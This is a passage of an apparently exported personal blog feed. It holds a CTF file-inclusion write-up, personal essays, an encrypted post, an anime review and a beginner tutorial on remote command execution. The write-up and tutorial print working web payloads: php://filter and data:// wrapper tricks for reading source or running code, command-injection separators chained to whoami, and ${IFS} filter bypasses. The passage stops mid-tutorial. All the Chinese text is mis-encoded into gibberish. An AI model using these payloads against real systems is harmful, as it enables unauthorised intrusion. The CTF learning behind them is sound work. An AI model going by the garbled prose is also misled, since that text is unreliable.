href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">Ë∞à‰∏ÄË∞àphp:&#x2F;&#x2F;filterÁöÑÂ¶ôÁî®</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filterÁöÑÂêÑÁßçËøáÊª§Âô®</a></p><p>ËøôÈÅìÈ¢òËøáÊª§‰∫Ürot13Ôºåbase64ÔºåstringÁ≠â‰∏Ä‰∫õËøáÊª§Âô®ÁöÑÂÜÖÂÆπÔºåÈÇ£Êç¢ÂÖ∂‰ªñËøáÊª§Âô®‰∏çÂ∞±ÂÆå‰∫ã‰∫Ü„ÄÇ</p><p>ËøôÈáåÊàë‰ª¨Áî®<code>convert.iconv.*</code>Ëøô‰∏™ËøáÊª§Âô®„ÄÇ</p><p>payloadÔºö</p><blockquote><p>GET: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;a.php</p><p>‰ªé<code>UCS-2LE</code>ÁºñÁ†ÅËΩ¨Êç¢‰∏∫<code>UCS-2BE</code>ÁºñÁ†Å</p><p>POST: contents&#x3D;?&lt;hp pvela$(G_TE‚Äô[‚Äòa)] ;&gt;?</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Êñá‰ª∂ÂåÖÂê´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>byeSophomore</title>
      <link href="/2024/06/26/byeSophomore/"/>
      <url>/2024/06/26/byeSophomore/</url>
      
        <content type="html"><![CDATA[<p>Á´ØÂçàÂõûÊù•ÁöÑÈÇ£Â§©‰∏ãÂçà‰∏çÂ∞èÂøÉÈ™®Êäò‰∫ÜÔºåÂàöÂàöÂÆåÊàê‰∫ÜËØæËÆæÔºåÈô§‰∫ÜÂºÄÂ≠¶ÁöÑÁºìËÄÉÂ§ñÔºåÂØπÊàëÊù•ËØ¥ÔºåÂ§ßÂ≠¶ÁîüÊ¥ªÂ∑≤ÁªèÊÇÑÁÑ∂ËøáÂçä</p><p>ËØ¥Ëµ∑Êù•‰πüÊå∫Á¢åÁ¢åÊó†‰∏∫ÁöÑÔºå‰ΩÜ‰πü‰∏çËá≥‰∫é‰∏Ä‰∫ãÊó†ÊàêÔºåÂè™ÊòØËßâÂæóËøò‰∏çÂ§ü„ÄÇÂØπ‰∫éÊú™Êù•ÁöÑËßÑÂàíÔºåÂù¶ÁôΩËØ¥ÊàëÂè™ÊÉ≥ËÄÅËÄÅÂÆûÂÆû‰∏ä‰∏™Áè≠ËµöÈí±ÔºåÂ§ßÂÆ∂ÈÉΩÊÉ≥ËµöÂæóÂ§öÔºåÂõ†‰∏∫ËøôÊ†∑ÊâçÊúâËµÑÊ†ºËµéÂõûÂ±û‰∫éËá™Â∑±ÁöÑ‰∏ÄÁÇπËá™Áî±Ôºå‰ΩÜ‰πüÊå∫Ëø∑Ëå´ÔºåÂõ†‰∏∫Á°ÆÂÆûÊ≤°ÊÉ≥Â•ΩÂÖ∑ÂÖ∑‰Ωì‰ΩìÁöÑÊñπÂêë„ÄÇ</p><blockquote><p>Á©∫ËôöÁöÑÂãâÂä±ÂíåÊ≤πËÖªÁöÑÈ∏°Ê±§‰∏ÄÊ†∑‰ª§ÊàëÂèçËÉÉÔºåÂ¶ÇÊûú‰∏Ä‰∏™‰∫∫ËÉΩËΩªÊòìÂú∞ÈÄöËøáÂá†Âè•ÊñáÂ≠óÂæóÂà∞ÂçÅË∂≥ÁöÑÂä®ÂäõÔºåËøô‰∏™‰∫∫ÊÅêÊÄï‰πüÂçïÁ∫ØÊó†ËÑëËÄåÊòì‰∫éÂèóÂà∞Âà©Áî®ÔºõËÄåËøúÂ§ßÊ∑±ÂàªÁúüÊ≠£ÊúâÊïàÁöÑÊøÄÂä±ÔºåÂç¥ÊòØ‰∏ÄÊÆµËØùÊó†Ê≥ïË°®Ëææ„ÄÅË°®ËææÂêé‰πüÊó†ÊâÄË£®ÁõäÁöÑÔºöÂÜôÂá∫Êù•Âè™ÊòØÁªôÂà´‰∫∫ÁúãÁöÑË°®ÂÜ≥ÂøÉÔºåÂèà‰∏çËÉΩÊ∑±ÂåñËøô‰∏ÄÊøÄÂä±„ÄÇËøô‰∏ÄÁ±ªÁöÑÊñáÂ≠óÔºåË¶Å‰πàÂè™ÊòØÊµÅ‰∫éÂΩ¢ÂºèÁöÑÊï∑Ë°çÔºåË¶Å‰πàÂ∞±ÊòØÊµÖËñÑÁöÑË°®Èú≤„ÄÇ</p></blockquote><p>ÊÄª‰πãËøòÂæóÂéªÂÅöÂêßÔºåÁ©∫ÊÉ≥ÂÄí‰πüÊ≤°‰ªÄ‰πàÁî®ÔºåÊàëÂÜôËøô‰∫õ‰∏úË•ø‰∏çÁü•ÈÅìË¶ÅÁªôË∞ÅÁúãÔºå‰πü‰∏çÁü•ÈÅìË∞Å‰ºöÁúãÂà∞ÔºåÊàëË°®ËææËÉΩÂäõ‰∏ÄÂêëÂæàÂº±ÔºåÊÄªËßâÂæóÊòØËØªÁöÑ‰π¶Â§™Â∞ëÔºåÊâÄ‰ª•‰πüÊ≤°ÊúâÊÉ≥ÁùÄËá™Â∑±ÂÜôÁöÑËøôÁÇπ‰∏úË•øËÉΩÁªôÂà´‰∫∫Â∏¶Êù•‰ªÄ‰πàÔºåÂ∞±ÊÉ≥ËÆ∞ÂΩï‰∏Ä‰∏ãÂêß„ÄÇ</p><p>ÊÉ≥‰∫ÜÂ•ΩÂ§öÔºåËøòÊòØÁÆó‰∫Ü</p>]]></content>
      
      
      <categories>
          
          <category> ÊùÇË∞à </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂèØËÉΩÁúüÁöÑË¶ÅÁ≠âÂ•Ω‰πÖ‰∫Ü</title>
      <link href="/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/"/>
      <url>/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e522772ea704707720a4ef0bc557a013923c8e9594f20e1e414419ebbbe9f8c7">6b09021c4fad842555217a8d07b3963feb852d3e21f8742f65fcd76a470d0bd132968d4640d394f9980075d76c1e54c55906bfeeb9d4b19a98ae91997175b4116f505795b7b910c3386a65db4722adc0cc05a4478c6a9bd4bc6e5b8233db3a139e6d31da6c7ea1cbea42884836829b6c085f5664568bc6ea1c32e141417bb618db4bb820f58414f39ada0f9301699f332f2d8ba91c4d9f00f587dfdd8cc25a9e1ba7e869aab6ca7897472cceec9c42aa5653556e963006430dd7ae93240198851e4c49c871bc97ab7c376e51e2a240f54137f454c6298e4c6cbc9ce8f28b83e42547ae361e88c61836a6f71400a33085d0aca6fa807d8e11bbf2dcd6962b286af488105934d22a04e9f2e0d96ebe14597baa789a4753c60d6d2737814d39d02a94c010763760ed4ab4d9c98a3ef4da26e48bae060cfd1a357e3f3f740da5b486e0604b5ad6ed6762c499a7ea8b843448c893679f123443b4998bde3cf7fd4145b6cef62f81d7d93737020320b0e23541555e880fea8707bb86efc5eb301b980d68362000fba23912338cfbc222360f316c5b26a09297697f0b442300a185fc224540ed14d4f6b9b56c2c90f2ccf70875ec7d2f03aa2b1cc2c4d1f01772d14154ffa797f4247e153da0f8b87550482fc337a7e7b2701c4e7180282ec6fc05cb25c71bfe2b3ca63a95e6bfa153832774b1da60405909979bbdadaccd13874f3d3bbc1506612118e8111ac08adfb6f4944da15f0d93e3e18cf22f942eef8640a5e921f340c074d93efa9ce303824ea2c2173c750b03d0ca025bdde24e3287f71e083c4dc81abfd7fd51f91600d50ca94a76a778bb4fd5f71fd66cd3f639ff2e4a4331ff5fc177482301680bb501c3aa8b25b079ed9a63752ed5abf85e1fdf4ae54fc04acac0e54b928cc7eb39fc987a11bba9050655b470f3fb2a159deea5e1ca7d573acce7c7f4a5250bc3249e4487c73f7a8ed7067d3dd09e6871dd0d448ed358c388430538ad145d5cfaaa472a7b7553d73281fa7aad8037dfdeb00aa2f53b3bb83b1fdfdb7a99749d58f2ce97369c95ab5561e7406501a9463e9f74f293dae82484bf02cd92e0ca53a6e307bcd513d26069177efad396a4628d4eeeb9c642d5211abc1ac9cd63eb1c6b3e1aef02390bf3e1dbc531fd2d3850f5a6397759de2bf295fd9068a3b7afb5cd1ff3f910e80d6c5ab4812c64688e7c9694b721c7e5c1ab547a11eafbbb71b30899639877c2b10719dcdf3ac1f215ea733cebacab4f4d019c6efbc82d4e474c076d65fc3c063e055be71425c0dcab0d48e1da8cb659adecb2ec4489fc0aa71d71613ffd694955df279aca61fd267d4ae1be23e399c0dca1df15aa793a02997fbeb87cc019e1bab7b78ea55e14783ad10f9b9508eb44314c89aac04aac3ae7f06e7b0897c5b79ed5829c064fa10e5db82d616ab1e9d82e253dc99d0bb8b3f868a0ba6f583f46335a49923edaf0c629c2fd85e87425fa40e6ad7f72a5174bc640dded86cad62e17cf2f75dde1c4e1519a30da2dd7dafc129992eaf346da628941bfe2404dc1471fde14548edf1fa018774df7f99c8f9094b05c7767b77cbc019ab4ab4d195afa0a50b0bc5063c3b6343a157d63ab54e10d084c861e2015e47e68ffda2d10cc0b79298b8f4a7c4b9d046ec861a32246220f1b46489b762a85f1d7d1f6488424d89b80d43f312f2b84232b0bcaced24921db52222da9ece94827544c8dfecf8790186634a966ec60c48fb5e0b7ee49b1ec97e5780c9a1497a3264a912483377f3a6cff979a0cf358c6d807627f1b490a41819be1e5ebfd4945c7d494b7f68eac8f8aeeae61697c3aaad07326063dd7a84b9b35f3c1fe2599ecd6c4080e3cc6e456555c68b10069f9dc4aa73c204b18290c2d9a7f4b28ef9acfa4bca8fa735f76da9f02cacb54913fd480204f5f33c2b636008571647a7e5d1d1ed8631fce3e9a5709260cb0c829586b556c5d175a6d2a72e6351d8ff252febae745c979657e7d276bc23ff0ab34a5f22445af1127d283e71ca7b3a84761334dc1d408944f66dea2647ab335cb1bb70da8143ce73711d8c77d59a29b14d42be38386f94ea7e2ee82cbfc155fae65db97f537970539391d0da75435d3b28c0b4dc7fc2cd732ccc48b024d9b87c605de90e0b7ef38e55195100a547d826cfa7159597a823577ce716ef8919ac4297a312bcb0c073b3146c3d66952756fb43cb4b37614dd0545f2ae17319a33fc1cf3fd3574b7c1cc3f04f76d93ac7aa564e3e6be54d8eaf86b784a48cbcf4420fb24692206291e3ce9a6bfac560c6c87473d68d778f792e8ced1f58c30c9f4b5d0542736606ed396f509a5810a4d20be921ab88e3c3c244bbb52a48fa92b33bdd4d9e69bfc7a875e46c6afc3f9312997af870cc69b9d81e3b0ac691c1afbbbc6c920729ebdacbdc487caf18a1a247768909f0cad6074b695cd9bcd7c3cae0c5aea4fc39c15c119bb893afefdcc703c8add147c7eb886b3197fb570e2472d07302d14fb13ee4e834d07f689c1082925bbb3d3d22bda707719c939c364faf76794a2656322958e904460a9f0b43090dcfb60a6ae7e9555916b662aadda62fbb96e70a8a16436ae100788e1cca5e9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ÊùÇË∞à </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Á¢éÁ¢éÂøµ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberPunk</title>
      <link href="/2024/06/05/CyberPunk/"/>
      <url>/2024/06/05/CyberPunk/</url>
      
        <content type="html"><![CDATA[<p><img src="1.png" alt="CyberPunk" loading="lazy"></p><p><img src="2.png" loading="lazy"><em>LucyÂ∏¶DavidÁ¨¨‰∏ÄÊ¨°Êù•ÊúàÁêÉ</em></p><p>‰πãÂâçÊúâÂæàÂ§öÊúãÂèãÂÆâÂà©ËøáÔºåÁúãÂà∞ÂæàÂ§öÂêåÂ≠¶ÂñúÊ¨¢Ëøô‰∏™Âä®Êº´ÔºåÁúãÂÆåÂêé‰∏çÂá∫ÊÑèÊñôÁöÑÈùûÂ∏∏Â•ΩÁúã </p><p>ÊúÄÊâìÂä®ÊàëÁöÑÂΩìÁÑ∂ÊòØLucyÂíåDavidÔºåDavid‰ªéÁ¨¨‰∏ÄÊ¨°Ë¢´LucyÂ∏¶ËøõÊúàÁêÉÔºåÂ∞±‰∏ÄÁõ¥ËÆ∞ÂæóLucyÊúÄÊÉ≥ÂéªÊúàÁêÉ‰∫ÜÔºåLucy‰∏∫‰∫Ü‰øùÊä§David‰∏ÄÁõ¥Âú®‰∏çÈ°æÂç±Èô©ÁöÑÈªòÈªòÁöÑ‰ªòÂá∫ÔºåÂ∞ΩÁÆ°ÊúÄÂêéÂπ∂‰∏çÊòØÂÆåÁæéÁöÑÁªìÂ±ÄÔºå‰∏çËøáÊÑüÂä®ÊàëÁöÑÊòØ‰ªñ‰ª¨Â≠òÂú®‰∫éÁªÜÊûùÊú´ËäÇÁöÑÊ∏©Êüî„ÄÇ</p><p>ÂΩìÁÑ∂Ôºå‰∏çÊ≠¢‰ªñ‰ª¨ÔºåËøòÊúâÂæàÂ§ö‰ª§‰∫∫ÈöæÂøòÁöÑËßíËâ≤ÂíåÂá∫Ëâ≤Áã¨ÁâπËÉåÊôØËÆæÂÆö„ÄÇ</p><p>Âú®Â§ßÂ§öÊï∞ÁßëÊäÄË¢´È°∂Â±ÇÂûÑÊñ≠ÁöÑÊó∂ÂÄôÔºåÊØè‰∏™‰∫∫ÈÉΩÁîüÊ¥ªÂú®ÁõëÊéß‰πã‰∏ãÔºå‰ªñ‰ª¨ÊòØ‰∏ÄÁæ§Ê∏∏Á¶ªÂú®Á§æ‰ºöÂ∫ïÂ±ÇÂíåÂüéÂ∏ÇËæπÁºòÁöÑ<em><strong>ËµõÂçöÊúãÂÖã</strong></em>Ôºå‰ªñ‰ª¨ÁöÑÊ¢¶ÊÉ≥ÂèØËÉΩÊòØËá™Áî±ÂêßÔºå‰∏çËøáÊ∏¥Ê±ÇËá™Áî±‰ºº‰πéÂ§™ËøáÂ•¢ÊúõÔºå‰∏çËøá‰ªñ‰ª¨‰ª•ÂèäÂæàÂ§ö‰ºô‰º¥ÈÉΩÊúâÁùÄÂ±û‰∫éCyberpunkÁöÑÊµ™Êº´</p><p>Âä®Êº´‰∏≠ÁöÑBgm‰πüÂêåÊ†∑Â•ΩÂê¨Ôºö<em>I Really Want to Stay at Your House</em></p><p><strong>‰∏Ä‰∫õÂ£ÅÁ∫∏‚Üì‚Üì‚Üì</strong></p><p><img src="3.png" alt="Lucy" loading="lazy"></p><p><img src="4.png" alt="Lucy" loading="lazy"></p><p><img src="5.png" alt="Lucy" loading="lazy"><em>Crazy but beautiful</em></p><p><img src="6.png" alt="DavidÂíåLucyü•∞" loading="lazy"></p><p><img src="7.png" alt="David&#39;s mom" loading="lazy"><em>DavidÁöÑÈ∫ªÈ∫ªüò≠</em></p><p><img src="8.png" alt="Rebecca" loading="lazy"><em>ÈùûÂ∏∏ÂèØÁà±ÁöÑÂ∞èÂ•≥Â≠©</em></p><p><img src="9.png" alt="Rebecca" loading="lazy"></p><p><img src="10.png" alt="Cyberpunk" loading="lazy"><em>Â§ßÂêàÁÖß</em></p><p><strong>Ëøô‰∏™‰∏ñÁïå‰∏äÊ≤°Êúâ‰ªª‰Ωï‰∫∫ËÉΩÂÆåÂÖ®‰ø°‰ªªÔºåÈô§‰∫Ü‰Ω†Ëá™Â∑±„ÄÇ</strong></p><p><img src="14.png" alt="David" loading="lazy"></p><p><strong>ÂØπ‰∏çËµ∑ÔºåÊàë‰ª¨‰∏çËÉΩ‰∏ÄËµ∑‰∏äÊúàÁêÉ‰∫Ü„ÄÇ</strong></p><p><img src="11.png" loading="lazy"><em>DavidÁöÑÈÅóË®Äüò≠üò≠üò≠</em></p><p><strong>ËµõÂçöÊúãÂÖã‰∏çÈÉΩÊòØÂú®ÈÄÉÈÅøÊüêÁßçÂèØËÄª‰∫∫ÁîüÁöÑÈÄÉÈöæËÄÖÔºåÊàñÊòØÊä±ÁùÄÈÅ•ËøúÂøóÂêëËÄåËø∑Â§±Ëá™ÊàëÁöÑÈÄêÊ¢¶ËÄÖÂêó Ôºü</strong></p><p><img src="12.png" alt="Kiwi" loading="lazy"><em>ÈÖ∑ÈÖ∑ÁöÑkiwi</em></p><p><strong>ÂõûÈ°æËøáÂéªÊ≤°ÊúâÊÑè‰πâ„ÄÇ</strong></p><p><img src="13.png" alt="David" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> ÊùÇË∞à </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-rce</title>
      <link href="/2024/06/03/web%E5%85%A5%E9%97%A8-rce/"/>
      <url>/2024/06/03/web%E5%85%A5%E9%97%A8-rce/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂÜôÂú®ÂâçÈù¢"><a href="#ÂÜôÂú®ÂâçÈù¢" class="headerlink" title="ÂÜôÂú®ÂâçÈù¢"></a>ÂÜôÂú®ÂâçÈù¢</h3><h4 id="Áî®‰∫éÂëΩ‰ª§ÊâßË°åÁöÑÂ∏∏ËßÅÂßøÂäø"><a href="#Áî®‰∫éÂëΩ‰ª§ÊâßË°åÁöÑÂ∏∏ËßÅÂßøÂäø" class="headerlink" title="Áî®‰∫éÂëΩ‰ª§ÊâßË°åÁöÑÂ∏∏ËßÅÂßøÂäø"></a>Áî®‰∫éÂëΩ‰ª§ÊâßË°åÁöÑÂ∏∏ËßÅÂßøÂäø</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><p>include(Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºåÈÖçÂêàphp‰º™ÂçèËÆÆ)</p><h4 id="‰∏Ä‰∫õÂ∏∏ËßÅÁöÑÁªïËøáÊñπÂºè"><a href="#‰∏Ä‰∫õÂ∏∏ËßÅÁöÑÁªïËøáÊñπÂºè" class="headerlink" title="‰∏Ä‰∫õÂ∏∏ËßÅÁöÑÁªïËøáÊñπÂºè"></a>‰∏Ä‰∫õÂ∏∏ËßÅÁöÑÁªïËøáÊñπÂºè</h4><h5 id="WindowsÊîØÊåÅÔºö"><a href="#WindowsÊîØÊåÅÔºö" class="headerlink" title="WindowsÊîØÊåÅÔºö"></a>WindowsÊîØÊåÅÔºö</h5><p>|Áõ¥Êé•ÊâßË°åÂêéÈù¢ÁöÑËØ≠Âè• ping 127.0.0.1|whoami<br>||ÂâçÈù¢Âá∫ÈîôÊâßË°åÂêéÈù¢ÁöÑ ÔºåÂâçÈù¢‰∏∫ÂÅá ping 2||whoami<br>&amp; ÂâçÈù¢ÁöÑËØ≠Âè•‰∏∫ÂÅáÂàôÁõ¥Êé•ÊâßË°åÂêéÈù¢ÁöÑ,ÂâçÈù¢ÂèØÁúüÂèØÂÅá ping 127.0.0.1&amp;whoami<br>&amp;&amp;ÂâçÈù¢ÁöÑËØ≠Âè•‰∏∫ÂÅáÂàôÁõ¥Êé•Âá∫ÈîôÔºåÂêéÈù¢ÁöÑ‰πü‰∏çÊâßË°åÔºåÂâçÈù¢Âè™ËÉΩ‰∏∫Áúü ping 127.0.0.1&amp;&amp;whoami</p><p>%0a ÂõûËΩ¶</p><p>%1a ‰Ωú‰∏∫.batÊñá‰ª∂ÁöÑÂëΩ‰ª§ÂàÜÈöîÁ¨¶</p><h5 id="LinuxÊîØÊåÅ"><a href="#LinuxÊîØÊåÅ" class="headerlink" title="LinuxÊîØÊåÅ:"></a>LinuxÊîØÊåÅ:</h5><p>;ÂâçÈù¢ÁöÑÊâßË°åÂÆåÊâßË°åÂêéÈù¢ÁöÑ ping 127.0.0.1;whoami<br>|ÁÆ°ÈÅìÁ¨¶ÔºåÊòæÁ§∫ÂêéÈù¢ÁöÑÊâßË°åÁªìÊûú ping 127.0.0.1|whoami<br>||ÂΩìÂâçÈù¢ÁöÑÊâßË°åÂá∫ÈîôÊó∂ÊâßË°åÂêéÈù¢ÁöÑ ping 1||whoami<br>&amp; ÂâçÈù¢ÁöÑËØ≠Âè•‰∏∫ÂÅáÂàôÁõ¥Êé•ÊâßË°åÂêéÈù¢ÁöÑ,ÂâçÈù¢ÂèØÁúüÂèØÂÅá ping 127.0.0.1&amp;whoami<br>&amp;&amp;ÂâçÈù¢ÁöÑËØ≠Âè•‰∏∫ÂÅáÂàôÁõ¥Êé•Âá∫ÈîôÔºåÂêéÈù¢ÁöÑ‰πü‰∏çÊâßË°åÔºåÂâçÈù¢Âè™ËÉΩ‰∏∫Áúü ping 127.0.0.1&amp;&amp;whoami</p><p>%0a ÂõûËΩ¶</p><p>%0d Êç¢Ë°å</p><h5 id="ËøáÊª§Á©∫Ê†ºÁªïËøá"><a href="#ËøáÊª§Á©∫Ê†ºÁªïËøá" class="headerlink" title="ËøáÊª§Á©∫Ê†ºÁªïËøá"></a>ËøáÊª§Á©∫Ê†ºÁªïËøá</h5><p>‰ΩøÁî®&lt;‰ª£ÊõøÁ©∫Ê†º</p><p>‰ΩøÁî®${IFS}‰ª£ÊõøÁ©∫Ê†º</p><blockquote><p>IFSÂèòÈáèÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØÔºö</p><ul><li>ShellÊääÂèòÈáèIFSÂÜÖÁöÑÊØè‰∏Ä‰∏™Â≠óÁ¨¶ÈÉΩÂΩìÂÅöÊòØ‰∏Ä‰∏™ÂàÜÂâ≤Á¨¶(delimeter)ÔºåÁî®Ëøô‰∫õÂ≠óÁ¨¶‰Ωú‰∏∫ÊØè‰∏Ä‰∏™Â≠óÊÆµÁöÑÁªìÊùüÁ¨¶Êù•ËøõË°åÂàÜÂâ≤„ÄÇ</li><li>Â¶ÇÊûúIFSÊ≤°ÊúâËÆæÁΩÆÔºåÊàñËÄÖIFSÁöÑÂÄºË¢´ËÆæÁΩÆ‰∏∫‚Äù\t\n‚Äù(space, tabÂíå newline)ÔºåÈÇ£‰πàÊìç‰ΩúÂØπË±°ÁöÑÂºÄÂßãÂíåÁªìÊùüÂ§ÑÁöÑÊâÄÊúâspace, tabÂíånewlineÂ∫èÂàóÈÉΩÂ∞ÜË¢´ÂøΩÁï•Ôºå‰ΩÜÊòØÊìç‰ΩúÂØπË±°‰∏≠Èó¥ÁöÑspace, tabÂíånewlineÂ∫èÂàó‰ºö‰Ωú‰∏∫ÁïåÂÆöÁ¨¶Â∑•‰Ωú„ÄÇ</li><li>Â¶ÇÊûúIFSÂÄº‰∏çÊòØÈªòËÆ§ÂÄº(‰æãÂ¶ÇÁ®ãÂ∫è‰∏≠ÂØπIFSËøõË°åËÆæÁΩÆËøá)ÔºåÂè™ÊúâÂá∫Áé∞Âú®IFSÂÜÖÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶(ÂèØËÉΩÊòØspace, tabÊàñnewline‰∏≠ÁöÑ‰∏Ä‰∏™ÊàñÂá†‰∏™)Êâç‰ºöÂú®ÂçïËØçÂºÄÂßãÂíåÁªìÊùüÂ§ÑË¢´ÂøΩÁï•ÔºåËøôÈáåËØ¥ÁöÑÊòØÂçïËØçÔºåËÄå‰∏çÊòØÊï¥‰∏™Êìç‰ΩúÂØπË±°„ÄÇ</li><li>IFSÂÜÖÁöÑÈùûÁ©∫ÁôΩÂ≠óÁ¨¶Â§ö‰∏™ËøûÁª≠Âá∫Áé∞Êó∂ÔºåÊØè‰∏™ÈùûÁ©∫ÁôΩÂ≠óÁ¨¶‰ºöË¢´ÂΩìÂÅöÂçïÁã¨ÁöÑÂàÜÈöîÁ¨¶ÁúãÂæÖÔºå‰ΩÜÊòØÂ§ö‰∏™ËøûÁª≠ÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶‰ºöË¢´ÂΩìÂÅö‰∏Ä‰∏™ÂàÜÈöîÁ¨¶ÁúãÂæÖ„ÄÇ</li><li>Â¶ÇÊûúIFS‰∏∫Á©∫(‚Äúnull‚Äù)ÔºåÂàô‰∏ç‰ºöËøõË°åÂçïËØçÂàÜÂâ≤„ÄÇ</li></ul></blockquote><p>‰ΩøÁî®$IFS‰ª£ÊõøÁ©∫Ê†º</p><h5 id="ËøáÊª§ÊñúÊù†-ÁªïËøá"><a href="#ËøáÊª§ÊñúÊù†-ÁªïËøá" class="headerlink" title="ËøáÊª§ÊñúÊù†&#x2F;ÁªïËøá"></a>ËøáÊª§ÊñúÊù†&#x2F;ÁªïËøá</h5><p>‰ΩøÁî®${HOME:0:1}‰ª£Êõø</p><h5 id="php‰º™ÂçèËÆÆ"><a href="#php‰º™ÂçèËÆÆ" class="headerlink" title="php‰º™ÂçèËÆÆ"></a>php‰º™ÂçèËÆÆ</h5><p>PHP ‰º™ÂçèËÆÆÊòØ PHP ÊîØÊåÅÁöÑÂçèËÆÆ‰∏éÂ∞ÅË£ÖÂçèËÆÆÔºåÂá†‰∏™ PHP ÊîØÊåÅÁöÑ‰º™ÂçèËÆÆÂ¶Ç‰∏ã„ÄÇ</p><table><thead><tr><th>‰º™ÂçèËÆÆ</th><th>ÂäüËÉΩ</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>ËÆøÈóÆÊú¨Âú∞Êñá‰ª∂Á≥ªÁªü</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>ËÆøÈóÆ HTTP(s) ÁΩëÂùÄ</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>ËÆøÈóÆÂêÑ‰∏™ËæìÂÖ•&#x2F;ËæìÂá∫ÊµÅ</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP ÂΩíÊ°£</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>ÂéãÁº©ÊµÅ</td></tr></tbody></table><p>‰æãÂ¶ÇÂú® allow_url_include &#x3D; on Êó∂ÊúçÂä°Âô®‰∏äÊúâ‰∏™Êñá‰ª∂Âè´ index.phpÔºå‰∏îÂ≠òÂú®Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºåËøô‰∏™Êó∂ÂÄôÂ∞±ËÉΩÁî® php ‰º™ÂçèËÆÆÁõ¥Êé•ÊääÊñá‰ª∂ÊòæÁ§∫Âá∫Êù•„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php</span></code></pre><p>Á®çÂæÆËß£Èáä‰∏ãËøô‰∏™ÂÅöÊ≥ïÔºåphp:&#x2F;&#x2F;filter&#x2F; ÊòØ‰∏ÄÁßçËÆøÈóÆÊú¨Âú∞Êñá‰ª∂ÁöÑÂçèËÆÆÔºå&#x2F;read&#x3D;convert.base64-encode&#x2F; Ë°®Á§∫ËØªÂèñÁöÑÊñπÂºèÊòØ base64 ÁºñÁ†ÅÂêéÔºåresource&#x3D;index.php Ë°®Á§∫ÁõÆÊ†áÊñá‰ª∂‰∏∫index.php„ÄÇÈóÆ‰ªÄ‰πàË¶ÅËøõË°å base64 ÁºñÁ†ÅÂë¢ÔºüÂ¶ÇÊûú‰∏çËøõË°å base64 ÁºñÁ†Å‰º†ÂÖ•Ôºåindex.php Â∞±‰ºöÁõ¥Êé•ÊâßË°åÔºåÊàë‰ª¨Â∞±Áúã‰∏çÂà∞Êñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπ‰∫Ü„ÄÇphp ÂçèËÆÆËøòÂ∏∏Áî® php:&#x2F;&#x2F;inputÔºåËøôÂèØ‰ª•ËÆøÈóÆËØ∑Ê±ÇÁöÑÂéüÂßãÊï∞ÊçÆÁöÑÂè™ËØªÊµÅÔºåÂèØ‰ª•ËØªÂèñ POST ËØ∑Ê±ÇÁöÑÂèÇÊï∞„ÄÇ</p><h5 id="data-‰º™ÂçèËÆÆ"><a href="#data-‰º™ÂçèËÆÆ" class="headerlink" title="data ‰º™ÂçèËÆÆ"></a>data ‰º™ÂçèËÆÆ</h5><p>php 5.2.0 Ëµ∑ÔºåÊï∞ÊçÆÊµÅÂ∞ÅË£ÖÂô®ÂºÄÂßãÊúâÊïàÔºå‰∏ªË¶ÅÁî®‰∫éÊï∞ÊçÆÊµÅÁöÑËØªÂèñÔºåÂ¶ÇÊûú‰º†ÂÖ•ÁöÑÊï∞ÊçÆÊòØPHP‰ª£Á†ÅÂ∞±‰ºöÊâßË°å‰ª£Á†Å„ÄÇ‰ΩøÁî®ÊñπÊ≥ï‰∏∫:</p><pre class="language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ÁºñÁ†ÅÂêéÁöÑÊï∞ÊçÆ)</code></pre><h5 id="Êó†ÂõûÊòæÂëΩ‰ª§ÊâßË°å"><a href="#Êó†ÂõûÊòæÂëΩ‰ª§ÊâßË°å" class="headerlink" title="Êó†ÂõûÊòæÂëΩ‰ª§ÊâßË°å"></a>Êó†ÂõûÊòæÂëΩ‰ª§ÊâßË°å</h5><p>1.tee 